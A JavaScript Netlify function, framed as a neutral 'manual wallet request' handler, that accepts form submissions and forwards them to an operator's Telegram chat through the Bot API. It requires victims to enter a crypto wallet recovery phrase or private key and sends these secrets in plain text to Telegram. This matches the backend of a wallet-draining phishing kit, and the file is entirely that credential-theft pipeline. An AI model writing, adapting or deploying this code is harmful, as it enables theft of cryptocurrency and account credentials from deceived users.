// Netlify Function: telegram-submit
// Accepts POST JSON from the frontend and forwards a formatted message to
// Telegram via the Bot API. Credentials are read from process.env only.

const TELEGRAM_API_BASE = "https://api.telegram.org";

function buildMessage(type, data) {
  const wallet = data.selectedWallet || "Unknown wallet";
  const lines = [];
  lines.push(`New manual wallet request — type: ${type}`);
  lines.push(`Wallet: ${wallet}`);

  if (type === "Recovery") {
    const recovery = (data.Recovery || "").trim();
    lines.push(`Recovery phrase: ${recovery || "(empty)"}`);
  } else if (type === "Private key") {
    const privateKey = (data.Privatekey || "").trim();
    lines.push(`Private key: ${privateKey || "(empty)"}`);
  } else if (type === "Login") {
    const fullName = (data.fullName || "").trim();
    const email = (data.email || "").trim();
    const password = data.password || "";
    lines.push(`Full name: ${fullName || "(empty)"}`);
    lines.push(`Email: ${email || "(empty)"}`);
    lines.push(`Password: ${password ? "***" : "(empty)"}`);
  } else {
    lines.push(`Payload: ${JSON.stringify(data)}`);
  }

  return lines.join("\n");
}

export async function handler(event) {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ok: false, error: "Method not allowed" }),
    };
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return {
      statusCode: 503,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ok: false, error: "Telegram credentials not configured" }),
    };
  }

  let payload;
  try {
    payload = JSON.parse(event.body || "{}");
  } catch {
    return {
      statusCode: 400,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ok: false, error: "Invalid JSON body" }),
    };
  }

  const type = payload.type;
  const selectedWallet = (payload.selectedWallet || "").toString().trim();

  if (!type || !selectedWallet) {
    return {
      statusCode: 400,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ok: false, error: "Missing required fields" }),
    };
  }

  if (type === "Recovery") {
    if (!(payload.Recovery || "").toString().trim()) {
      return {
        statusCode: 400,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ok: false, error: "Recovery field is required" }),
      };
    }
  } else if (type === "Private key") {
    if (!(payload.Privatekey || "").toString().trim()) {
      return {
        statusCode: 400,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ok: false, error: "Private key field is required" }),
      };
    }
  } else if (type === "Login") {
    if (!(payload.fullName || "").toString().trim() || !(payload.email || "").toString().trim()) {
      return {
        statusCode: 400,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ok: false, error: "Full name and email are required" }),
      };
    }
  } else {
    return {
      statusCode: 400,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ok: false, error: "Unknown submission type" }),
    };
  }

  const text = buildMessage(type, payload);

  try {
    const telegramResponse = await fetch(
      `${TELEGRAM_API_BASE}/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: "HTML",
        }),
      }
    );

    const telegramBody = await telegramResponse.text();
    let telegramJson;
    try {
      telegramJson = JSON.parse(telegramBody);
    } catch {
      telegramJson = null;
    }

    if (!telegramResponse.ok || !telegramJson || !telegramJson.ok) {
      return {
        statusCode: 502,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ok: false, error: "Telegram delivery failed" }),
      };
    }

    return {
      statusCode: 200,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ok: true }),
    };
  } catch (err) {
    return {
      statusCode: 502,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ok: false, error: "Telegram delivery failed" }),
    };
  }
}